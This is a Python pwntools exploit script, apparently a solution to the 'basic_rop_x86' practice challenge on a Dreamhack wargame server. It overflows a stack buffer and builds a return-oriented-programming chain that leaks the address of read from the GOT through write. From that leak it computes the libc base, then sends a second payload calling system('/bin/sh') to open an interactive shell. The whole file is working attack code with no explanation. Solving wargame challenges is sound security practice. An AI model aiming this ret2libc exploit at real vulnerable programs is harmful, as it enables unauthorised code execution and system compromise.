from pwn import *

#p = process("./basic_rop_x86")
p=remote("host3.dreamhack.games",21331)
#print(f"PID : {p.pid}")

def slog(name, addr): return success(': '.join([name, hex(addr)]))

#e = ELF("./basic_rop_x86")
#r = ROP("./basic_rop_x86")


dummy = b'a' * 0x48

e = context.binary = ELF("./basic_rop_x86", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
rop = ROP(e)

write_plt = e.plt["write"]
read_got = e.got["read"]
main = e.symbols["main"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
exit_offset = libc.symbols["exit"]
binsh_offset = next(libc.search(b"/bin/sh"))

cleanup_gadget = rop.find_gadget(
    ["pop esi","pop edi","pop ebp","ret"]
).address

payload = dummy
payload += p32(write_plt)
payload += p32(cleanup_gadget)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)
payload += p32(main)

p.send(payload)
p.recvuntil(b"a" * 0x40)
read_addr = u32(p.recvn(4))
#p.recvn(0x40 - 0x4)

libc_base = read_addr - read_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset
ex = libc_base + exit_offset

success(f"read: {read_addr:#x}")
success(f"libc base: {libc_base:#x}")
success(f"system: {system:#x}")
success(f"/bin/sh: {binsh:#x}")


payload = dummy
payload += p32(system)
payload += p32(ex)
payload += p32(binsh)

p.send(payload)
p.recvuntil(b"a" * 0x40)

p.interactive()
